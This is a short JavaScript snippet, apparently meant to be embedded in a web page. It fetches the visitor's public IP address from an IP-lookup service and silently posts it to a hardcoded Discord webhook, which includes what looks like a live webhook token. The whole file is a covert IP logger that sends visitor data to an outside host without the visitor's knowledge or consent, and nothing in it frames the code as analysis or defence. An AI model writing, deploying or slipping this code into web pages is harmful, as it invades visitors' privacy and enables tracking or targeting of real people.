var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response){
    return response.json();
})
.then(function(data){
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1133087019497685072/UP3wPf2Sv8p-DxCni0KOyCzkay0lVmVCz8_ylK1GXqH8woCvh6xnvbnPZDBkAcNbcDjw'
    var message = {
        content: 'IP:' + ip
    };
    
    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});

